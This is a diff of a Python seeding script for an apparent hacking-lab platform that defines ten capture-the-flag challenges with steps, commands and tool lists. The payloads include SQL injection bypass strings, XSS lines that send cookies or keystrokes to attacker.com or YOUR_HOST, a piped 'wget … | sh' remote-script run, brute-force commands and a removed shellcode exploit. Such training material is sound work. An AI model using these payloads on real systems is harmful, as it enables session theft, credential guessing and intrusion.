@@ -1,5 +1,6 @@
 from app import app, db, Challenge, User, VMStatus
 from datetime import datetime, timezone
+import json
 from werkzeug.security import generate_password_hash
 
 def init_challenges():
@@ -13,28 +14,31 @@ def init_challenges():
     challenges = [
         {
             'name': 'SQL Injection - Login Bypass',
-            'description': 'This challenge demonstrates a classic SQL Injection vulnerability in a login form. The application directly concatenates user input into a SQL query without proper sanitization, allowing attackers to manipulate the query structure and bypass authentication.',
-            'how_to_execute': (
-                "1. Navigate to the login page\n"
-                "2. In the username field, enter: ' OR '1'='1\n"
-                "3. Enter any password (it won't be checked)\n"
-                "4. The application will execute: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'any_password'\n"
-                "5. Since '1'='1' is always true, you'll be logged in as the first user in the database (typically admin)"
-            ),
+            'description': 'Classic SQL Injection in a login form allowing authentication bypass.',
+            'how_to_execute': 'Follow the step-by-step execution steps listed in `execution_steps`.',
+            'execution_steps': [
+                'Open a browser and navigate to the target login page (e.g. http://192.168.1.10/login).',
+                "Inspect the login form to confirm the POST parameters (usually 'username' and 'password').",
+                "In the username field enter:  ' OR '1'='1  and enter any password (or leave blank).",
+                'Submit the form and observe whether you are authenticated as a user (often the first user, e.g., admin).',
+                'If the above fails, try terminating and commenting the rest of the query:  admin\'--  or  \' OR \"1\"=\"1\"--',
+                'Use an intercepting proxy (Burp) to replay and modify requests, or run sqlmap to confirm and enumerate the database.',
+                'Locate the flag in the profile or admin area after successful login (e.g., /admin or /profile).'
+            ],
             'commands': (
-                "Manual Testing:\n"
-                "1. Basic Bypass: ' OR '1'='1\n"
-                "2. Comment out rest: admin'--\n"
-                "3. With password: ' OR '1'='1'--\n"
-                "\nAutomated Testing with SQLmap:\n"
-                "sqlmap -u \"http://target.com/login\" --data \"username=test&password=test\" --level=5 --risk=3 --dbms=mysql"
+                "# Manual: try payloads in the username field\n"
+                "' OR '1'='1\n"
+                "admin'--\n"
+                "\n# Curl example to reproduce login POST:\n"
+                "curl -s -X POST 'http://192.168.1.10/login' -d 'username=\' OR \'1\'=\'1\'&password=test' -L\n"
+                "\n# Automated testing with sqlmap (confirm first with proxy/interception):\n"
+                "sqlmap -u 'http://192.168.1.10/login' --data 'username=__USER__&password=__PASS__' --level=3 --risk=2 --batch"
             ),
             'tools': [
-                'Browser Developer Tools (F12)',
-                'Burp Suite',
+                'Browser (Chrome/Firefox) with Developer Tools',
+                'Burp Suite (intercept & repeater)',
                 'OWASP ZAP',
-                'SQLmap',
-                'Manual testing with crafted inputs'
+                'sqlmap (for automated confirmation)'
             ],
             'real_world_use': (
                 "SQL injection is one of the most critical web vulnerabilities, responsible for numerous high-profile data breaches. "
@@ -57,28 +61,30 @@ def init_challenges():
         },
         {
             'name': 'Cross-Site Scripting (XSS)',
-            'description': 'This challenge demonstrates a Reflected Cross-Site Scripting (XSS) vulnerability where user input is directly reflected in the page without proper output encoding, allowing attackers to execute arbitrary JavaScript in the context of the vulnerable page.',
-            'how_to_execute': (
-                "1. Identify a search or input field that reflects your input\n"
-                "2. Test for XSS by entering: <script>alert('XSS')</script>\n"
-                "3. If the alert pops up, the site is vulnerable\n"
-                "4. To steal cookies: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\n"
-                "5. The flag is stored in the admin's cookie"
-            ),
+            'description': 'Reflected XSS where input is echoed without escaping, allowing JavaScript execution in victims\' browsers.',
+            'how_to_execute': 'Follow the `execution_steps` below to discover and exploit reflected XSS safely.',
+            'execution_steps': [
+                'Locate input points that reflect user input (search boxes, URL parameters, comment fields).',
+                "Submit a simple payload: <script>alert('XSS')</script> and observe if it executes (use a non-destructive payload first).",
+                'If the alert appears, confirm the context (HTML body, attribute, JavaScript string) by testing variants like <img src=x onerror=alert(1)> or \"\'\">\'">\".',
+                'To exfiltrate an admin cookie in the lab, host a simple listener (e.g., netcat or a public XSS collector) and use a safe payload to send cookies: new Image().src="http://YOUR_HOST/collect?c="+document.cookie',
+                'Use Burp to intercept and replay payloads, and encode/obfuscate payloads if filters exist (HTML entities, URL encoding).',
+                'After successful exfiltration, retrieve the flag value from captured requests or the admin cookie as specified in the challenge. '
+            ],
             'commands': (
-                "Basic XSS Test:\n"
-                "<script>alert('XSS')</script>\n\n"
-                "Steal Cookies:\n"
-                "<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>\n\n"
-                "Keylogger Example:\n"
-                "<script>document.onkeypress = function(e) { fetch('http://attacker.com/keylogger?key=' + e.key); }</script>"
+                "# Non-destructive test payloads to try in input fields:\n"
+                "<script>alert('XSS')</script>\n"
+                "<img src=x onerror=alert(1)>\n"
+                "<svg/onload=alert(1)>\n"
+                "\n# Example: send cookie to your collector (replace YOUR_HOST):\n"
+                "<script>new Image().src='http://YOUR_HOST/collect?c='+encodeURIComponent(document.cookie)</script>\n"
+                "\n# Use Burp Repeater to refine payloads and bypass simple filters."
             ),
             'tools': [
                 'Browser Developer Tools',
-                'Burp Suite',
+                'Burp Suite (Repeater, Intruder)',
                 'OWASP ZAP',
-                'XSS Hunter',
-                'BeEF Framework'
+                'Local HTTP collector (netcat, simple HTTP server)'
             ],
             'real_world_use': (
                 "XSS is commonly exploited in phishing attacks and session hijacking. In 2018, British Airways suffered an XSS attack "
@@ -101,32 +107,28 @@ def init_challenges():
         },
         {
             'name': 'Network Traffic Analysis',
-            'description': 'This challenge involves analyzing a packet capture (pcap) file to uncover sensitive information, credentials, or hidden data within network traffic. You\'ll need to use network analysis tools to examine the captured traffic and find the flag.',
-            'how_to_execute': (
-                "1. Download the provided pcap file from the challenge page\n"
-                "2. Open the file in Wireshark: wireshark capture.pcap\n"
-                "3. Look for HTTP traffic: http in the filter\n"
-                "4. Follow TCP streams to reconstruct conversations\n"
-                "5. Look for file transfers, credentials, or interesting strings\n"
-                "6. The flag is hidden in one of the packets"
-            ),
+            'description': 'Analyze a provided packet capture (pcap) to find hidden credentials or a flag.',
+            'how_to_execute': 'Open the pcap in Wireshark or tshark and follow the guided `execution_steps`.',
+            'execution_steps': [
+                'Download the pcap file from the challenge page to your analysis workstation.',
+                'Open the pcap in Wireshark: File → Open → select the pcap.',
+                'Start with protocol filters: apply `http` or `tcp` to narrow traffic.',
+                'Use "Follow → TCP Stream" on interesting TCP conversations to reconstruct requests/responses.',
+                'Check known plaintext protocols (FTP, SMTP, IMAP, HTTP) for credentials or file transfer contents.',
+                'Search for strings: use "Find Packet" → String to search for keywords like "flag", "password", "Authorization".',
+                'If data is encoded (base64), extract and decode it locally to reveal the flag.'
+            ],
             'commands': (
-                "Basic Wireshark Filters:\n"
-                "http - Show all HTTP traffic\n"
-                "tcp.port == 80 - Filter for web traffic\n"
-                "http.request.method == \"POST\" - Find form submissions\n"
-                "ftp or smtp or imap - Find common plaintext protocols\n\n"
-                "Command Line Analysis with tshark:\n"
-                "tshark -r capture.pcap -Y \"http.request\" -T fields -e http.host -e http.request.uri\n"
-                "tshark -r capture.pcap -T fields -e data.text -o data.show_as_text:TRUE"
+                "# Quick tshark commands (replace capture.pcap):\n"
+                "tshark -r capture.pcap -Y http -T fields -e http.host -e http.request.uri\n"
+                "tshark -r capture.pcap -T fields -e frame.number -e ip.src -e ip.dst -e data.text | sed -n '1,200p'\n"
+                "\n# Extract a TCP stream as raw data (Wireshark GUI: Export Selected Packet Bytes) or use tcpflow/tshark."
             ),
             'tools': [
                 'Wireshark',
-                'TShark (command-line Wireshark)',
-                'NetworkMiner',
-                'Tcpdump',
-                'ngrep',
-                'Bro/Zeek'
+                'tshark',
+                'tcpflow',
+                'strings + base64 (for quick decoding)'
             ],
             'real_world_use': (
                 "Network traffic analysis is fundamental in cybersecurity for detecting intrusions, investigating incidents, "
@@ -149,32 +151,29 @@ def init_challenges():
         },
         {
             'name': 'Password Cracking',
-            'description': 'This challenge involves cracking password hashes using various techniques. You\'ll need to identify the hash type, select an appropriate attack method, and use password cracking tools to recover the original password.',
-            'how_to_execute': (
-                "1. Identify the hash type using hash-identifier or online tools\n"
-                "2. Choose the appropriate hash mode for your cracking tool\n"
-                "3. Select a wordlist (e.g., rockyou.txt, SecLists)\n"
-                "4. Run the cracking tool with the correct parameters\n"
-                "5. The cracked password will reveal the flag"
-            ),
+            'description': 'Crack provided password hash(es) by identifying the hash type and using appropriate cracking techniques.',
+            'how_to_execute': 'Perform reconnaissance on the hash, select attack mode and wordlists, then run a cracking tool.',
+            'execution_steps': [
+                'Obtain the hash string(s) provided by the challenge and save them to `hashes.txt`.',
+                'Identify the hash type: run `hashid <hash>` or `python3 -m hashID`.',
+                'Choose an attack strategy: dictionary (rockyou), rule-based, or brute force depending on complexity.',
+                'Run Hashcat with the correct mode (e.g., -m 0 for MD5, -m 1000 for NTLM): `hashcat -m <mode> -a 0 hashes.txt rockyou.txt --status --status-timer=10`.',
+                'If dictionary fails, try rule-based or combinator attacks; adjust mask/brute-force length carefully to avoid long runs.',
+                'When a password is recovered, use it to retrieve the flag as instructed by the challenge (login, decrypt file, etc.).'
+            ],
             'commands': (
-                "Identify Hash Type:\n"
-                "hash-identifier <hash>\n"
-                "hashid -m <hash>\n\n"
-                "Hashcat Commands:\n"
-                "hashcat -m 0 -a 0 hashes.txt rockyou.txt  # Dictionary attack\n"
-                "hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a  # Brute force 4 chars\n\n"
-                "John the Ripper Commands:\n"
-                "john --format=raw-md5 --wordlist=rockyou.txt hashes.txt\n"
-                "john --format=nt hashes.txt --show"
+                "# Identify hash type:\n"
+                "hashid $(head -n1 hashes.txt)\n"
+                "\n# Example Hashcat dictionary attack (replace MODE):\n"
+                "hashcat -m MODE -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --potfile-path=cracked.pot --status\n"
+                "\n# John the Ripper example:\n"
+                "john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt\n"
             ),
             'tools': [
                 'Hashcat',
                 'John the Ripper',
-                'hash-identifier',
-                'Hashcat-Utils',
-                'RainbowCrack',
-                'Online hash crackers (as a last resort)'
+                'hashid (or hash-identifier)',
+                'wordlists (rockyou, SecLists)'
             ],
             'real_world_use': (
                 "Password cracking is essential for security professionals during penetration tests and forensic investigations. "
@@ -198,31 +197,33 @@ def init_challenges():
         },
         {
             'name': 'Privilege Escalation',
-            'description': 'This challenge involves escalating privileges from a standard user to root on a Linux system by exploiting misconfigurations, vulnerable services, or weak permissions. You\'ll need to identify and leverage these weaknesses to gain elevated access.',
-            'how_to_execute': (
-                "1. Enumerate the system for potential privilege escalation vectors\n"
-                "2. Check for misconfigured file permissions, SUID/SGID binaries, cron jobs, etc.\n"
-                "3. Identify vulnerable services running with root privileges\n"
-                "4. Exploit the identified vulnerability to gain root access\n"
-                "5. The flag is located at /root/flag.txt"
-            ),
+            'description': 'Gain elevated privileges on a Linux VM by enumerating misconfigurations or vulnerable services.',
+            'how_to_execute': 'Follow systematic enumeration in `execution_steps` to identify escalation vectors and exploit them.',
+            'execution_steps': [
+                'Access the target VM (SSH or console) with the provided user credentials.',
+                'Run basic enumeration: `id`, `uname -a`, `hostname`, `cat /etc/os-release`.',
+                "Collect system info and set up a workspace: `mkdir /tmp/enum && cd /tmp/enum`.",
+                'Enumerate SUID/SGID binaries: `find / -perm -4000 -type f 2>/dev/null` and check each binary for exploitability.',
+                'Check sudo permissions: `sudo -l` to see allowed commands that can be abused.',
+                "Look for writable files in important locations (`find / -writable -type f 2>/dev/null`) and misconfigured cron jobs (`ls -la /etc/cron*` and `crontab -l`).",
+                'Use automated enumeration scripts (LinPEAS, LinEnum) to highlight likely vectors, then manually verify and exploit the highest-confidence findings.',
+                'Once you obtain root, read `/root/flag.txt` to retrieve the flag.'
+            ],
             'commands': (
-                "Basic Enumeration Commands:\n"
-                "id; uname -a; cat /etc/passwd; sudo -l\n"
-                "find / -perm -u=s -type f 2>/dev/null  # Find SUID binaries\n"
-                "find / -writable -type d 2>/dev/null  # World-writable directories\n\n"
-                "Common Exploit Commands:\n"
-                "sudo -l  # Check sudo permissions\n"
-                "getcap -r / 2>/dev/null  # Check for capabilities\n"
-                "crontab -l  # Check cron jobs"
+                "# Basic reconnaissance:\n"
+                "id; uname -a; cat /etc/os-release\n"
+                "\n# Find SUID binaries:\n"
+                "find / -perm -4000 -type f 2>/dev/null | sort -u\n"
+                "\n# Check sudo rights for current user:\n"
+                "sudo -l\n"
+                "\n# Run LinPEAS (if available):\n"
+                "wget -qO- https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n"
             ),
             'tools': [
-                'LinEnum.sh',
-                'LinPEAS',
-                'Linux Exploit Suggester',
-                'GTFOBins',
-                'Metasploit',
-                'Manual enumeration commands'
+                'LinPEAS / LinEnum',
+                'GTFOBins (reference)',
+                'Burp/Metasploit (if network services present)',
+                'Manual shell enumeration commands'
             ],
             'real_world_use': (
                 "Privilege escalation is a critical phase in penetration testing and red team operations. In 2016, the "
@@ -246,33 +247,32 @@ def init_challenges():
         },
         {
             'name': 'Forensics - File Recovery',
-            'description': 'This challenge involves recovering deleted or hidden files from a disk image. You\'ll need to use forensic tools to analyze the disk image, identify file signatures, and extract the flag from the recovered data.',
-            'how_to_execute': (
-                "1. Download the provided disk image file\n"
-                "2. Use file recovery tools to analyze the disk image\n"
-                "3. Look for file signatures (magic numbers) of common file types\n"
-                "4. Extract and examine the recovered files\n"
-                "5. The flag is hidden within one of the recovered files"
-            ),
+            'description': 'Recover deleted or hidden files from a provided disk image to locate the flag.',
+            'how_to_execute': 'Mount or analyze the disk image and run targeted recovery steps listed in `execution_steps`.',
+            'execution_steps': [
+                'Copy the disk image to your analysis machine: `scp user@host:/path/disk.img ./` or download from the challenge page.',
+                'Do not modify the original image; work on a copy: `cp disk.img work-disk.img`.',
+                'Run `file work-disk.img` to identify image type and partitions.',
+                'If partitions are present, use `fdisk -l work-disk.img` or `mmls` (Sleuth Kit) to find offsets and mount the partition read-only.',
+                'Use `foremost -i work-disk.img -o recover/` or `scalpel` to carve files by signature into an output folder.',
+                'Search recovered files for the flag: `grep -R "FLAG" recover/ -n` and inspect likely candidates.',
+                'If carving fails, use `strings work-disk.img | grep -i FLAG` and review extracted strings for clues.'
+            ],
             'commands': (
-                "Basic File Analysis:\n"
-                "file disk.img  # Identify file type\n"
-                "binwalk disk.img  # Search for embedded files\n"
-                "strings disk.img | grep -i flag  # Search for flag string\n\n"
-                "File Recovery Commands:\n"
-                "foremost -i disk.img -o output/  # Recover files by type\n"
-                "scalpel -c /etc/scalpel.conf -o output/ disk.img\n"
-                "testdisk /log disk.img  # For partition recovery"
+                "# Work on a copy:\n"
+                "cp disk.img working.img\n"
+                "\n# Identify partitions (Sleuth Kit mmls):\n"
+                "mmls working.img\n"
+                "\n# Recover files with foremost:\n"
+                "foremost -i working.img -o recovered_foremost\n"
+                "\n# Quick search for flags:\n"
+                "grep -R --line-number -i 'FLAG' recovered_foremost || strings working.img | grep -i 'FLAG' -n\n"
             ),
             'tools': [
-                'Autopsy',
-                'Foremost',
-                'Scalpel',
-                'TestDisk',
-                'PhotoRec',
-                'Binwalk',
-                'dd',
-                'Sleuth Kit'
+                'Foremost / Scalpel',
+                'Sleuth Kit (mmls, fls, icat)',
+                'Autopsy (GUI)',
+                'strings, grep, binwalk'
             ],
             'real_world_use': (
                 "File recovery is crucial in digital forensics for incident response and criminal investigations. In the 2016 "
@@ -296,35 +296,31 @@ def init_challenges():
         },
         {
             'name': 'Reverse Engineering',
-            'description': 'This challenge requires analyzing a compiled binary to understand its functionality, bypass security checks, and extract the flag. You\'ll use reverse engineering tools to disassemble the binary and analyze its behavior without access to the source code.',
-            'how_to_execute': (
-                "1. Download the provided binary file\n"
-                "2. Use a disassembler to analyze the binary\n"
-                "3. Look for the main function and key decision points\n"
-                "4. Identify the password validation logic\n"
-                "5. The flag will be revealed when the correct password is entered"
-            ),
+            'description': 'Analyze a binary to find the validation logic or secret that reveals the flag.',
+            'how_to_execute': 'Disassemble and debug the binary following the `execution_steps` to locate the flag or password.',
+            'execution_steps': [
+                'Download the challenge binary and make it executable: `chmod +x challenge`.',
+                'Check file type and architecture: `file challenge`.',
+                'Extract readable strings: `strings challenge | less` to find obvious hints (e.g., format strings, file paths).',
+                'Load the binary in a disassembler (Ghidra/IDA) and locate `main` or the input handling routine.',
+                'Identify comparison routines used for password checks and either patch the binary, bypass the check, or run it under a debugger to force the success path.',
+                'If dynamic analysis is easier, run under GDB and set breakpoints at suspicious functions to inspect variables and registers.',
+                'Once you trigger the success condition (correct input or patched check), retrieve the flag output or file location.'
+            ],
             'commands': (
-                "Basic Analysis Commands:\n"
-                "file challenge  # Check file type\n"
-                "strings challenge | less  # Extract strings\n"
-                "ltrace ./challenge  # Trace library calls\n"
-                "strace ./challenge  # Trace system calls\n\n"
-                "GDB Commands:\n"
-                "gdb ./challenge\n"
-                "(gdb) info functions  # List functions\n"
-                "(gdb) disassemble main  # Disassemble main function"
+                "# Quick local checks:\n"
+                "file challenge\n"
+                "strings challenge | grep -i flag -n\n"
+                "\n# Run under GDB:\n"
+                "gdb --args ./challenge\n"
+                "(gdb) break main\n"
+                "(gdb) run\n"
+                "\n# Use Ghidra/IDA for deeper static analysis."
             ),
             'tools': [
-                'Ghidra',
-                'IDA Pro',
-                'Radare2',
-                'GDB with GEF/PEDA',
-                'Hopper',
-                'Binary Ninja',
-                'objdump',
-                'strings',
-                'ltrace/strace'
+                'Ghidra / IDA Pro / Binary Ninja',
+                'GDB with GEF or PEDA',
+                'objdump, strings, ltrace/strace'
             ],
             'real_world_use': (
                 "Reverse engineering is essential for malware analysis, vulnerability research, and security assessments. "
@@ -348,31 +344,31 @@ def init_challenges():
         },
         {
             'name': 'Web Application Firewall Bypass',
-            'description': 'This challenge focuses on bypassing a Web Application Firewall (WAF) to execute a cross-site scripting (XSS) attack. You\'ll need to analyze the WAF\'s filtering rules and develop payloads that evade detection while still executing in the browser.',
-            'how_to_execute': (
-                "1. Identify the WAF and its detection patterns\n"
-                "2. Test different encoding and obfuscation techniques\n"
-                "3. Bypass input validation and filtering\n"
-                "4. Execute a successful XSS payload that retrieves the flag\n"
-                "5. The flag is stored in an admin-only cookie"
-            ),
+            'description': 'Bypass a WAF to deliver a payload (commonly XSS) by analyzing filters and encoding payloads appropriately.',
+            'how_to_execute': 'Systematically probe filters and iterate payloads as listed in `execution_steps`.',
+            'execution_steps': [
+                'Identify the entry point protected by the WAF (form field, header, URL parameter).',
+                'Use `wafw00f` or Burp to fingerprint the WAF and understand common rules.',
+                'Start with benign variants (case changes, spacing, encoded characters) to see which characters are blocked.',
+                'Use obfuscation techniques: HTML entity encoding, URL encoding, concatenation, or tag variations (e.g., <img src=x onerror=>).',
+                'Test payloads via Burp Repeater and observe server responses and any blocking behavior.',
+                'When a payload bypasses the WAF, use it to exfiltrate the admin cookie or otherwise trigger the flag disclosure.',
+                'Document the final bypass payload and method for remediation notes.'
+            ],
             'commands': (
-                "Basic WAF Bypass Techniques:\n"
-                "1. Case Variation: <ScRiPt>alert(1)</ScRiPt>\n"
-                "2. HTML Encoding: &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;\n"
-                "3. JavaScript String Manipulation: eval('al' + 'ert(1)')\n\n"
-                "Advanced Techniques:\n"
+                "# Fingerprint the WAF:\n"
+                "wafw00f http://192.168.1.70/\n"
+                "\n# Example payloads to test (modify contextually):\n"
+                "<ScRiPt>alert(1)</ScRiPt>\n"
+                "%3Cscript%3Ealert(1)%3C%2Fscript%3E  # URL encoded\n"
                 "<img src=x onerror=alert(1)>\n"
-                "<svg/onload=alert(1)>\n"
-                "<body onpageshow=alert(1)>"
+                "\n# Use Burp Repeater to iterate quickly on payloads."
             ),
             'tools': [
                 'Burp Suite',
+                'wafw00f',
                 'OWASP ZAP',
-                'WAFW00F',
-                'XSS Hunter',
-                'Browser Developer Tools',
-                'Custom Python scripts for payload generation'
+                'Browser Developer Tools'
             ],
             'real_world_use': (
                 "WAF bypass techniques are crucial for security professionals testing the effectiveness of web application security. "
@@ -396,30 +392,28 @@ def init_challenges():
         },
         {
             'name': 'SSH Brute Force',
-            'description': 'This challenge involves performing a password spraying attack against an SSH server to gain unauthorized access. You\'ll use common usernames and passwords to find valid credentials and log in to the system.',
-            'how_to_execute': (
-                "1. Enumerate valid usernames on the target system\n"
-                "2. Prepare a list of common passwords\n"
-                "3. Use a password spraying tool to test the credentials\n"
-                "4. Once logged in, find the flag in the user's home directory\n"
-                "5. Escalate privileges if necessary to access the flag"
-            ),
+            'description': 'Perform a controlled password-spraying attack against an SSH service to discover valid credentials (within lab limits).',
+            'how_to_execute': 'Use careful, rate-limited attacks following `execution_steps` to avoid lockouts and noisy behavior.',
+            'execution_steps': [
+                'Confirm SSH is reachable: `nmap -p 22 192.168.1.80`.',
+                'Compile a small list of likely usernames and passwords (do not use large noisy lists in shared environments).',
+                'Run a rate-limited attacker (Hydra or Ncrack) with a small username/password set and low parallelism.',
+                'If valid credentials are found, SSH into the host: `ssh user@192.168.1.80` and search the user\'s home for the flag (`ls -la; cat ~/flag.txt`).',
+                'If necessary, perform post-auth enumeration and privilege escalation to reach the flag.'
+            ],
             'commands': (
-                "Username Enumeration:\n"
-                "nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt <target>\n\n"
-                "Hydra Commands:\n"
-                "hydra -L users.txt -P passwords.txt ssh://<target>\n"
-                "hydra -l admin -P rockyou.txt -t 4 ssh://<target>\n\n"
-                "Medusa Commands:\n"
-                "medusa -h <target> -U users.txt -P passwords.txt -M ssh"
+                "# Quick reachability test:\n"
+                "nmap -p 22 192.168.1.80\n"
+                "\n# Hydra example (rate-limited):\n"
+                "hydra -L users.txt -P passwords.txt -t 4 -w 5 ssh://192.168.1.80\n"
+                "\n# Ncrack example:\n"
+                "ncrack -u users.txt -p passwords.txt 192.168.1.80:22\n"
             ),
             'tools': [
+                'nmap',
                 'Hydra',
-                'Medusa',
-                'Patator',
                 'Ncrack',
-                'Metasploit (ssh_login module)',
-                'Custom Python scripts'
+                'Patator'
             ],
             'real_world_use': (
                 "SSH brute force attacks are commonly used by attackers to gain initial access to systems. In 2020, a large-scale "
@@ -443,44 +437,31 @@ def init_challenges():
         },
         {
             'name': 'Buffer Overflow',
-            'description': 'This advanced challenge involves exploiting a buffer overflow vulnerability in a network service to gain remote code execution. You\'ll need to analyze the binary, develop an exploit, and gain a reverse shell to retrieve the flag.',
-            'how_to_execute': (
-                "1. Fuzz the service to identify the vulnerable input\n"
-                "2. Determine the offset to control EIP\n"
-                "3. Find and bypass any memory protections (ASLR, NX, Stack Canaries)\n"
-                "4. Locate JMP ESP or similar instructions for code redirection\n"
-                "5. Generate shellcode and build the final exploit\n"
-                "6. Execute the exploit to gain a reverse shell and retrieve the flag"
-            ),
+            'description': 'Exploit a buffer overflow in a network service to achieve code execution and capture a reverse shell to obtain the flag.',
+            'how_to_execute': 'Use careful fuzzing, determine offsets, and build a reliable exploit following `execution_steps`.',
+            'execution_steps': [
+                'Confirm service is reachable and note the port: `nmap -sV -p <port> 192.168.1.90`.',
+                'Fuzz the input with incremental payloads to cause a crash (use AFL, boofuzz, or simple scripts).',
+                'When a crash occurs, generate a cyclic pattern and find the offset to EIP/RIP (pwntools pattern_create/pattern_offset).',
+                'Identify protections (ASLR, NX, PIE, stack canaries) with checksec and adapt approach (ROP, ret2libc, or bypass canaries).',
+                'Craft payload: padding + overwritten return address + ROP chain or shellcode; test locally and via the network service.',
+                'On success, establish a stable reverse shell and read the flag file (e.g., /home/user/flag.txt).'
+            ],
             'commands': (
-                "Fuzzing and Crash Analysis:\n"
-                'python -c "print(\'A\'*1000)" | nc <target> <port>\n'
-                "gdb -q ./vulnerable_binary\n"
-                "(gdb) pattern_create 1000\n"
-                "(gdb) pattern_offset $eip\n\n"
-                "Exploit Development (Python Example):\n"
+                "# Example: send long string to service to observe crash (replace target/port):\n"
+                "python -c \"print('A'*1000)\" | nc 192.168.1.90 9999\n"
+                "\n# Use pwntools to create pattern and find offset in a debugger:\n"
                 "from pwn import *\n"
-                "context(arch='i386', os='linux')\n"
-                "p = remote('<target>', <port>)\n"
-                "offset = 0\n"
-                "junk = 'A' * offset\n"
-                "eip = p32(0xdeadbeef)  # Replace with JMP ESP address\n"
-                "nops = '\x90' * 16\n"
-                "shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'\n"
-                "payload = junk + eip + nops + shellcode\n"
-                "p.send(payload)\n"
-                "p.interactive()"
+                "print(cyclic(2000))\n"
+                "\n# Check protections locally:\n"
+                "checksec --file=./vulnerable_binary\n"
             ),
             'tools': [
                 'GDB with GEF/PEDA',
                 'Pwntools',
-                'msfvenom',
-                'ROPgadget',
-                'ROPgadget2',
-                'ropper',
-                'checksec.sh',
-                'one_gadget',
-                'NASM'
+                'checksec',
+                'ROPgadget / ropper',
+                'msfvenom (shellcode)'
             ],
             'real_world_use': (
                 "Buffer overflow vulnerabilities have been responsible for some of the most devastating cyber attacks in history. "
@@ -507,10 +488,20 @@ def init_challenges():
 
     # Add challenges to database
     for challenge_data in challenges:
+        # Build structured execution steps: prefer explicit 'execution_steps' (list),
+        # otherwise derive from the multi-line 'how_to_execute' string.
+        raw_steps = challenge_data.get('execution_steps') or challenge_data.get('how_to_execute') or ''
+        if isinstance(raw_steps, list):
+            steps = raw_steps
+        else:
+            steps = [line.strip() for line in str(raw_steps).split('\n') if line.strip()]
+
         challenge = Challenge(
             name=challenge_data['name'],
             description=challenge_data['description'],
-            how_to_execute=challenge_data['how_to_execute'],
+            how_to_execute=challenge_data.get('how_to_execute'),
+            execution_steps=json.dumps(steps),
+            commands=challenge_data.get('commands'),
             real_world_use=challenge_data['real_world_use'],
             difficulty=challenge_data['difficulty'],
             category=challenge_data['category'],
@@ -518,6 +509,7 @@ def init_challenges():
             vm_name=challenge_data['vm_name'],
             target_ip=challenge_data['target_ip'],
             flag=challenge_data['flag'],
+            tools=str(challenge_data.get('tools', [])),
             hints=challenge_data['hints'],
             created_at=datetime.now(timezone.utc)
         )
